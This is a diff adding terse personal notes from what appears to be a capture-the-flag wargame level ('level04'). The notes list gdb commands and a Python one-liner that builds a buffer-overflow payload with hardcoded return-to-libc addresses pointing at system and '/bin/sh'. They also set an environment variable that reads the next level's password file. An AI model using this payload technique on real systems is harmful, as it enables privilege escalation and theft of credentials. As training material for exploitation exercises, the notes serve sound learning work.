@@ -1,0 +1,17 @@
+x/50s *((char **) environ)
+disass system
+python -c "print 156 * 'a' + '\xf7\xe6\xae\xd0'[::-1]+'\xdd\xff\xde\xe1'" > /tmp/4
+find 0xf7e2c000, 0xf7fd0000 , "/bin/sh
+
+set follow-fork-mode child
+
+~~
+
+export EXECV="cat /home/users/level05/.pass"
+gdb level04
+set follow-fork-mode child
+b *0x0804875b ; inside child
+r
+x/50s *((char **) environ)
+0xffffdf2c:	 "EXECV=/bin/cat"
+
